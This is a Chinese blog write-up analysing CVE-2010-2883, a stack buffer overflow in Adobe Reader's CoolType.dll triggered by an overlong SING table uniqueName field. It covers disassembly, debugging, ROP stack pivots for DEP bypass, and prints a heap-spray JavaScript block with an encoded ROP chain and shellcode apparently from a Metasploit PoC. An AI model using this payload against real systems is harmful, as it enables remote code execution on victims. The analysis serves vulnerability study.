---
title: 漏洞分析之CVE-2010-2883（栈溢出）
tags: [漏洞调试]
date: 2017-07-02 10:55
---
Adobe Acrobat和Reader都是美国Adobe公司开发的非常流行的PDF文件阅读器。        基于Window和Mac OS X的Adobe Reader和Acrobat 9.4之前的9.x版本，8.2.5之前的8.x版本的CoolType.dll中存在基于栈的缓冲区溢出漏洞。远程攻击者可借助带有TTF字体Smart INdependent Glyphlets (SING)表格中超长字段的PDF文
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><p><div class="toc"><div class="toc">
<ul>
<li><a href="#0x00-漏洞简介">0x00 漏洞简介</a></li>
<li><a href="#0x01-测试环境">0x01 测试环境</a></li>
<li><a href="#0x02-漏洞调试">0x02 漏洞调试</a><ul>
<li><a href="#0x1-基于字符串定位的漏洞分析方法">0x1 基于字符串定位的漏洞分析方法</a></li>
<li><a href="#0x2-sing数据结构分析">0x2 SING数据结构分析</a></li>
<li><a href="#0x3-ollydbg动态调试">0x3 Ollydbg动态调试</a><ul>
<li><a href="#恶意数据跟踪调试">恶意数据跟踪调试</a></li>
<li><a href="#rop链构造">ROP链构造</a></li>
</ul>
</li>
<li><a href="#0x4-heap-spray技术应用">0x4 heap spray技术应用</a></li>
</ul>
</li>
<li><a href="#0x03-漏洞验证">0x03 漏洞验证</a></li>
</ul>
</div>
</div>
</p>
<blockquote>
<p>之前调过一个关于浏览器的漏洞，因为第一次接触漏洞，所以很没有经验不知道最后怎么构造shellcode（特别是ROP链的写法），有幸再调试一个稍微简单点的CVE，具体查看poc中的ROP链编写。</p>
</blockquote>
<h1 id="0x00-漏洞简介">0x00 漏洞简介</h1>
<p>Adobe Acrobat和Reader都是美国Adobe公司开发的非常流行的PDF文件阅读器。 <br>
        基于Window和Mac OS X的Adobe Reader和Acrobat 9.4之前的9.x版本，8.2.5之前的8.x版本的CoolType.dll中存在基于栈的缓冲区溢出漏洞。远程攻击者可借助带有TTF字体Smart INdependent Glyphlets (SING)表格中超长字段的PDF文件执行任意代码或者导致拒绝服务（应用程序崩溃）。</br></p>
<h1 id="0x01-测试环境">0x01 测试环境</h1>
<table>
<thead>
<tr>
<th>虚拟机</th>
<th>winxp sp3 32bit</th>
</tr>
</thead>
<tbody><tr>
<td>adobe Reader</td>
<td>9.3.4</td>
</tr>
</tbody></table>
<p>利用OD以及IDA进行动静态结合的逆向分析</p>
<h1 id="0x02-漏洞调试">0x02 漏洞调试</h1>
<h2 id="0x1-基于字符串定位的漏洞分析方法">0x1 基于字符串定位的漏洞分析方法</h2>
<p>首先进行漏洞定位，这是分析的起始步骤，找到漏洞产生的现场，作为一个典型的stack overflow的漏洞，最典型的函数就是Strcat函数，同时本漏洞出现的原因是在堆SING表格的解析上，所以我们可以直接利用IDA分析（CoolType.dll文件）定位漏洞所在位置，alt+t搜索SING字符 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702094429872?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
利用IDA静态查看出问题的CoolType.dll动态链接库</br></img></br></p>
<pre class="prettyprint"><code class=" hljs avrasm"><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DCF9                 <span class="hljs-keyword">push</span>    ebp
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DCFA                 <span class="hljs-keyword">sub</span>     esp, <span class="hljs-number">104</span>h；分配栈空间<span class="hljs-number">0x104</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD00                 lea     ebp, [esp-<span class="hljs-number">4</span>]；后面的strcat会把执行结果保存在ebp中
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD04                 <span class="hljs-keyword">mov</span>     eax, dword_8230FB8
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD09                 xor     eax, ebp
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD0B                 <span class="hljs-keyword">mov</span>     [ebp+<span class="hljs-number">104</span>h], eax
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD11                 <span class="hljs-keyword">push</span>    <span class="hljs-number">4</span>Ch
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD13                 <span class="hljs-keyword">mov</span>     eax, offset loc_8184A54
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD18                 <span class="hljs-keyword">call</span>    __EH_prolog3_catch
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD1D                 <span class="hljs-keyword">mov</span>     eax, [ebp+arg_C]
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD23                 <span class="hljs-keyword">mov</span>     edi, [ebp+arg_0]
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD29                 <span class="hljs-keyword">mov</span>     ebx, [ebp+arg_4]
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD2F                 <span class="hljs-keyword">mov</span>     [ebp+var_28], edi
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD32                 <span class="hljs-keyword">mov</span>     [ebp+var_30], eax
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD35                 <span class="hljs-keyword">call</span>    sub_804172C
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD3A                 xor     esi, esi
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD3C                 cmp     dword ptr [edi+<span class="hljs-number">8</span>], <span class="hljs-number">3</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD40                 <span class="hljs-keyword">mov</span>     [ebp+var_4], esi
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD43                 jz      loc_803DF00
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD49                 <span class="hljs-keyword">mov</span>     [ebp+var_1C], esi
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD4C                 <span class="hljs-keyword">mov</span>     [ebp+var_18], esi
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD4F                 cmp     dword ptr [edi+<span class="hljs-number">0</span>Ch], <span class="hljs-number">1</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD53                 <span class="hljs-keyword">mov</span>     byte ptr [ebp+var_4], <span class="hljs-number">1</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD57                 jnz     loc_803DEA9
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD5D                 <span class="hljs-keyword">push</span>    offset aName    <span class="hljs-comment">; "name"</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD62                 <span class="hljs-keyword">push</span>    edi             <span class="hljs-comment">; int</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD63                 lea     ecx, [ebp+var_1C]
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD66                 <span class="hljs-keyword">mov</span>     [ebp+var_11], <span class="hljs-number">0</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD6A                 <span class="hljs-keyword">call</span>    sub_80217D7
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD6F                 cmp     [ebp+var_1C], esi
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD72                 jnz     short loc_803DDDD
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD74                 <span class="hljs-keyword">push</span>    offset aSing    <span class="hljs-comment">; "SING"</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD79                 <span class="hljs-keyword">push</span>    edi             <span class="hljs-comment">; int</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD7A                 lea     ecx, [ebp+var_24]；一个指向虚表的指针
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD7D                 <span class="hljs-keyword">call</span>    sub_8021B06；处理SING表
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD82                 <span class="hljs-keyword">mov</span>     eax, [ebp+var_24]
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD85                 cmp     eax, esi；判断是否为空
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD87                 <span class="hljs-keyword">mov</span>     byte ptr [ebp+var_4], <span class="hljs-number">2</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD8B                 jz      short loc_803DDC4；这里不跳转
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD8D                 <span class="hljs-keyword">mov</span>     ecx, [eax]；字体资源版本号，这里是<span class="hljs-number">1.0</span>版本
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD8F                 <span class="hljs-keyword">and</span>     ecx, <span class="hljs-number">0</span>FFFFh
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD95                 jz      short loc_803DD9F；这里跳转
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD97                 cmp     ecx, <span class="hljs-number">100</span>h
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD9D                 jnz     short loc_803DDC0
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD9F
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD9F loc_803DD9F:                            <span class="hljs-comment">; CODE XREF: sub_803DCF9+9Cj</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD9F                 <span class="hljs-keyword">add</span>     eax, <span class="hljs-number">10</span>h；寻找uniqueName，相对sing表入口偏移<span class="hljs-number">0x10</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DDA2                 <span class="hljs-keyword">push</span>    eax             <span class="hljs-comment">; Source</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DDA3                 lea     eax, [ebp+<span class="hljs-number">0</span>]；前面提到的申请的变量空间
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DDA6                 <span class="hljs-keyword">push</span>    eax             <span class="hljs-comment">; Dest</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DDA7                 <span class="hljs-keyword">mov</span>     byte ptr [ebp+<span class="hljs-number">0</span>], <span class="hljs-number">0</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DDAB                 <span class="hljs-keyword">call</span>    strcat；最后产生溢出的漏洞点
</code></pre>
<p>由上述汇编代码来看，漏洞产生的根本原因是在copy字符串时没有对字符创的长度进行检测，导致恶意数据覆盖返回地址，造成栈溢出。</p>
<h2 id="0x2-sing数据结构分析">0x2 SING数据结构分析</h2>
<p>这里介绍一款PDF二进制分析工具 PdfStreamDumper，用工具导入利用漏洞的PDF文件，在Object中找到Sing的Object，右键选择Save Decompressed Streams保存到本地。在保存的文件中能看到TableEntry数据结构</p>
<pre class="prettyprint"><code class=" hljs d"><span class="hljs-keyword">typedef</span> sturct_SING
{
    <span class="hljs-built_in">char</span> tag[<span class="hljs-number">4</span>];<span class="hljs-comment">//"SING"</span>
    ULONG checkSum;<span class="hljs-comment">//校验和</span>
    ULONG offset;<span class="hljs-comment">//相对文件偏移</span>
    ULONG length;<span class="hljs-comment">//数据长度</span>
} TableEntry;</code></pre>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702100520347?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p>根据TableEntry结构可知从SING入口偏移0x11c为SING真实数据，从书上知道了SING从真实数据偏移0x10为uniqueName域，从代码上可以看出strcat是将uniqueName复制到栈空间，直至遇到NULL字符串终止符。 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702100609200?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p>
<h2 id="0x3-ollydbg动态调试">0x3 Ollydbg动态调试</h2>
<ol>
<li>打开Adobe Reader,OD附加,f9</li>
<li>ctrl+g:803DD9F,f2</li>
<li>Adobe Reader中打开msf.pdf</li>
<li>OD中断到803DD9F处</li>
</ol>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702101532193?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
这段汇编将已经在内存里的uniqueName域copy至程序所运行的栈中，查看相关内存已经找到了SING中的数据 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702104902228?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702103120552?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
从第一个4byte到最后一个覆盖的地址，可以发现有0x328-0x12C=0x1FC byte <br>
一直执行到83DDAB，造成缓冲区溢出 <br>
溢出修改了一个虚表的指针使得指指向你精心构造的ROP链</br></br></br></img></br></img></br></br></img></p>
<p>这里为了方便调试将刚刚写入占中的地址全部设上访问中断 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702110521062?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
这样以来就可以在接下来对刚刚复制的恶意数据进行跟踪，调试。</br></img></br></p>
<h3 id="恶意数据跟踪调试">恶意数据跟踪调试</h3>
<p>这里取了第一个字节 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702125605113?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p>
<hr>
<p>这里循环取出 在栈里面的恶意数据 注意这里取出的是4byte <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702125814385?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p>
<hr>
<p>将栈上的数据复制到0x491274 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702130432817?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p>
<hr>
<p>内存访问断点断在了 一个将0x495220c写入0x12e608内存处 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702130752574?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p>
<hr>
<p>到这里才到关键点，有一个调用虚表的指令，一开始虚表是存在栈上的，但是被我们溢出覆盖成了恶意地址 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702131305256?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p>
<h3 id="rop链构造">ROP链构造</h3>
<p>因为软件本身自带DEP数据保护，所以这里我们需要构造DEP链来绕过它，构造ROP链的过程很巧妙。大体绕过DEP的思路如下：</p>
<ol>
<li>利用heap spray的方法将将0x0c0c0c0c处的内存喷上自己的shellcode（这里的shellcode要伪造成用户堆栈，需要有大量的ROP以及函数调用参数组成）</li>
<li>构造相关ROP使得0x0c0c0c0c成为当前程序的堆栈来执行伪造的堆栈</li>
</ol>
<p>这里我们采用了两条ROP指令将esp指向0x0c0c0c0c</p>
<p>首先我们看一下构造的shellcode</p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702133754464?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702133925971?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p>我们选取的ROP地址一个是0x4A82A714，另一个是0x4A80CB38,他们都位于icuncnv36.dll的地址空间，而在Adobe Reader的各个版本上，这个DLL两个地址不会随着改变，这也是我们选取他们的原因。</p>
<p>我们看一下他们的汇编指令 <br>
<strong>0x4A80CB38</strong> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702134555521?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></p>
<pre class="prettyprint"><code class=" hljs avrasm">leave：
<span class="hljs-keyword">mov</span> esp,ebp
<span class="hljs-keyword">pop</span> ebp</code></pre>
<p>使得sp指针指向0x4A82A714，这里很巧妙的应用了该指令</p>
<hr>
<p><strong>0x4A82A714</strong> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702134642900?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
现在栈顶应该是0x0c0c0c0c这样直接pop就直接可以到rop链那 <br>
最后成功到达rop链，这里总结一下ROP的精髓是控制esp也就是栈顶指针为你所用，其实是个栈翻转的作用，这里用了两次栈翻转，第一次没有shellcode，中间中转一下利用 第二个翻转将esp指到了shellcode的位置，这也ROP的巧妙之处吧。 <br>
一般运用stack pivot技术的时候一句<code>xchg eax，esp</code>就能够起到作用。</br></br></br></img></br></p>
<hr>
<p>下面就是执行shellcode的过程了</p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702184037105?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702184053547?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
将shellcode写在可以执行的内存上，从而绕过了DEP</br></img></p>
<h2 id="0x4-heap-spray技术应用">0x4 heap spray技术应用</h2>
<pre class="prettyprint"><code class=" hljs autohotkey">&lt;script type=<span class="hljs-string">"text/javascript"</span>&gt;
var s = unescape( '<span class="hljs-var_expand">%u4141%</span>u4141<span class="hljs-var_expand">%u63a5%</span>u4a80<span class="hljs-var_expand">%u0000%</span>u4a8a<span class="hljs-var_expand">%u2196%</span>u4a80<span class="hljs-var_expand">%u1f90%</span>u4a80<span class="hljs-var_expand">%u903c%</span>u4a84<span class="hljs-var_expand">%ub692%</span>u4a80<span class="hljs-var_expand">%u1064%</span>u4a80<span class="hljs-var_expand">%u22c8%</span>u4a85<span class="hljs-var_expand">%u0000%</span>u1000<span class="hljs-var_expand">%u0000%</span>u0000<span class="hljs-var_expand">%u0000%</span>u0000<span class="hljs-var_expand">%u0002%</span>u0000<span class="hljs-var_expand">%u0102%</span>u0000<span class="hljs-var_expand">%u0000%</span>u0000<span class="hljs-var_expand">%u63a5%</span>u4a80<span class="hljs-var_expand">%u1064%</span>u4a80<span class="hljs-var_expand">%u2db2%</span>u4a84<span class="hljs-var_expand">%u2ab1%</span>u4a80<span class="hljs-var_expand">%u0008%</span>u0000<span class="hljs-var_expand">%ua8a6%</span>u4a80<span class="hljs-var_expand">%u1f90%</span>u4a80<span class="hljs-var_expand">%u9038%</span>u4a84<span class="hljs-var_expand">%ub692%</span>u4a80<span class="hljs-var_expand">%u1064%</span>u4a80<span class="hljs-var_expand">%uffff%</span>uffff<span class="hljs-var_expand">%u0000%</span>u0000<span class="hljs-var_expand">%u0040%</span>u0000<span class="hljs-var_expand">%u0000%</span>u0000<span class="hljs-var_expand">%u0000%</span>u0001<span class="hljs-var_expand">%u0000%</span>u0000<span class="hljs-var_expand">%u63a5%</span>u4a80<span class="hljs-var_expand">%u1064%</span>u4a80<span class="hljs-var_expand">%u2db2%</span>u4a84<span class="hljs-var_expand">%u2ab1%</span>u4a80<span class="hljs-var_expand">%u0008%</span>u0000<span class="hljs-var_expand">%ua8a6%</span>u4a80<span class="hljs-var_expand">%u1f90%</span>u4a80<span class="hljs-var_expand">%u9030%</span>u4a84<span class="hljs-var_expand">%ub692%</span>u4a80<span class="hljs-var_expand">%u1064%</span>u4a80<span class="hljs-var_expand">%uffff%</span>uffff<span class="hljs-var_expand">%u0022%</span>u0000<span class="hljs-var_expand">%u0000%</span>u0000<span class="hljs-var_expand">%u0000%</span>u0000<span class="hljs-var_expand">%u0000%</span>u0001<span class="hljs-var_expand">%u63a5%</span>u4a80<span class="hljs-var_expand">%u0004%</span>u4a8a<span class="hljs-var_expand">%u2196%</span>u4a80<span class="hljs-var_expand">%u63a5%</span>u4a80<span class="hljs-var_expand">%u1064%</span>u4a80<span class="hljs-var_expand">%u2db2%</span>u4a84<span class="hljs-var_expand">%u2ab1%</span>u4a80<span class="hljs-var_expand">%u0030%</span>u0000<span class="hljs-var_expand">%ua8a6%</span>u4a80<span class="hljs-var_expand">%u1f90%</span>u4a80<span class="hljs-var_expand">%u0004%</span>u4a8a<span class="hljs-var_expand">%ua7d8%</span>u4a80<span class="hljs-var_expand">%u63a5%</span>u4a80<span class="hljs-var_expand">%u1064%</span>u4a80<span class="hljs-var_expand">%u2db2%</span>u4a84<span class="hljs-var_expand">%u2ab1%</span>u4a80<span class="hljs-var_expand">%u0020%</span>u0000<span class="hljs-var_expand">%ua8a6%</span>u4a80<span class="hljs-var_expand">%u63a5%</span>u4a80<span class="hljs-var_expand">%u1064%</span>u4a80<span class="hljs-var_expand">%uaedc%</span>u4a80<span class="hljs-var_expand">%u1f90%</span>u4a80<span class="hljs-var_expand">%u0034%</span>u0000<span class="hljs-var_expand">%ud585%</span>u4a80<span class="hljs-var_expand">%u63a5%</span>u4a80<span class="hljs-var_expand">%u1064%</span>u4a80<span class="hljs-var_expand">%u2db2%</span>u4a84<span class="hljs-var_expand">%u2ab1%</span>u4a80<span class="hljs-var_expand">%u000a%</span>u0000<span class="hljs-var_expand">%ua8a6%</span>u4a80<span class="hljs-var_expand">%u1f90%</span>u4a80<span class="hljs-var_expand">%u9170%</span>u4a84<span class="hljs-var_expand">%ub692%</span>u4a80<span class="hljs-var_expand">%uffff%</span>uffff<span class="hljs-var_expand">%uffff%</span>uffff<span class="hljs-var_expand">%uffff%</span>uffff<span class="hljs-var_expand">%u1000%</span>u0000<span class="hljs-var_expand">%u91be%</span>u7e18<span class="hljs-var_expand">%udb51%</span>ud9c4<span class="hljs-var_expand">%u2474%</span>u5af4<span class="hljs-var_expand">%uc931%</span>u31b1<span class="hljs-var_expand">%u7231%</span>u0313<span class="hljs-var_expand">%u1372%</span>uea83<span class="hljs-var_expand">%ufa6d%</span>uad8b<span class="hljs-var_expand">%u7965%</span>u4e73<span class="hljs-var_expand">%u1e75%</span>uabfd<span class="hljs-var_expand">%u1e44%</span>ub899<span class="hljs-var_expand">%uaef6%</span>uede9<span class="hljs-var_expand">%u45fa%</span>u05bf<span class="hljs-var_expand">%u2889%</span>u2968<span class="hljs-var_expand">%u863a%</span>u044e<span class="hljs-var_expand">%ubbbb%</span>u07b3<span class="hljs-var_expand">%uc63f%</span>ue7e7<span class="hljs-var_expand">%u097e%</span>ue6fa<span class="hljs-var_expand">%u7447%</span>ubbf7<span class="hljs-var_expand">%uf210%</span>u2baa<span class="hljs-var_expand">%u4e15%</span>uc777<span class="hljs-var_expand">%u5e65%</span>u34ff<span class="hljs-var_expand">%u613d%</span>ueb2e<span class="hljs-var_expand">%u3836%</span>u0df0<span class="hljs-var_expand">%u309b%</span>u15b9<span class="hljs-var_expand">%u7df8%</span>uad73<span class="hljs-var_expand">%u0aca%</span>u6782<span class="hljs-var_expand">%uf203%</span>u4629<span class="hljs-var_expand">%u01ac%</span>u8e33<span class="hljs-var_expand">%ufa0a%</span>ue646<span class="hljs-var_expand">%u8769%</span>u3d50<span class="hljs-var_expand">%u5310%</span>ua6d4<span class="hljs-var_expand">%u10b2%</span>u034e<span class="hljs-var_expand">%uf443%</span>uc009<span class="hljs-var_expand">%ub14f%</span>u8e5e<span class="hljs-var_expand">%u4453%</span>ua4b2<span class="hljs-var_expand">%ucd6f%</span>u6b35<span class="hljs-var_expand">%u95e6%</span>uaf11<span class="hljs-var_expand">%u4ea3%</span>uf63b<span class="hljs-var_expand">%u2009%</span>ue844<span class="hljs-var_expand">%u9df2%</span>u62e0<span class="hljs-var_expand">%uc91e%</span>u2898<span class="hljs-var_expand">%u0c74%</span>u572e<span class="hljs-var_expand">%u0e3a%</span>u5830<span class="hljs-var_expand">%u676a%</span>ud301<span class="hljs-var_expand">%uf0e5%</span>u369e<span class="hljs-var_expand">%u0e42%</span>u1bd5<span class="hljs-var_expand">%u87e2%</span>uc9b0<span class="hljs-var_expand">%uc5b7%</span>u2442<span class="hljs-var_expand">%uf3fb%</span>ucdc0<span class="hljs-var_expand">%u0783%</span>ua7d8<span class="hljs-var_expand">%u4c86%</span>u5b5e<span class="hljs-var_expand">%uunescapefa%</span>u5b0b<span class="hljs-var_expand">%udea9%</span>u3819<span class="hljs-var_expand">%u4d2c%</span>u91c1<span class="hljs-var_expand">%uf5cb%</span>uee60' )<span class="hljs-comment">;</span>
var <span class="hljs-literal">a</span> = unescape( <span class="hljs-string">"%"</span> + <span class="hljs-string">"u"</span> + <span class="hljs-string">"0"</span> + <span class="hljs-string">"c"</span> + <span class="hljs-string">"0"</span> + <span class="hljs-string">"c"</span> + <span class="hljs-string">"%u"</span> + <span class="hljs-string">"0"</span> + <span class="hljs-string">"c"</span> + <span class="hljs-string">"0"</span> + <span class="hljs-string">"c"</span> )<span class="hljs-comment">;</span>
<span class="hljs-keyword">while</span> (<span class="hljs-literal">a</span>.length + <span class="hljs-number">20</span> + <span class="hljs-number">8</span> &lt; <span class="hljs-number">65536</span>) <span class="hljs-literal">a</span>+=<span class="hljs-literal">a</span><span class="hljs-comment">;</span>
c = <span class="hljs-literal">a</span>.substring(<span class="hljs-number">0</span>, (<span class="hljs-number">0</span>x0c0c-<span class="hljs-number">0</span>x24)/<span class="hljs-number">2</span>)<span class="hljs-comment">;</span>
c += s<span class="hljs-comment">;</span>
c += <span class="hljs-literal">a</span><span class="hljs-comment">;</span>
f = c.substring(<span class="hljs-number">0</span>, <span class="hljs-number">65536</span>/<span class="hljs-number">2</span>)<span class="hljs-comment">;</span>
<span class="hljs-keyword">while</span>(f.length &lt; <span class="hljs-number">0</span>x80000) f += f<span class="hljs-comment">;</span>
k = f.substring(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>x80000 - (<span class="hljs-number">0</span>x1020-<span class="hljs-number">0</span>x08) / <span class="hljs-number">2</span>)<span class="hljs-comment">;</span>
var NwBg = new Array()<span class="hljs-comment">;</span>
for (OYV=<span class="hljs-number">0</span><span class="hljs-comment">;OYV&lt;0x1f0;OYV++) NwBg[OYV]=k+"s";</span>
&lt;/script&gt;</code></pre>
<p>因为pdf支持javascript脚本，所以利用javascript代码进行内存喷射，将shellcode重复写到内存上</p>
<h1 id="0x03-漏洞验证">0x03 漏洞验证</h1>
<p>选用的是msf生成的poc文件，主要功能是弹出计算器，下面结合该poc文件进行相关漏洞分析预测试</p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702093146087?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p>漏洞执行成功</p></hr></hr></hr></hr></hr></hr></div>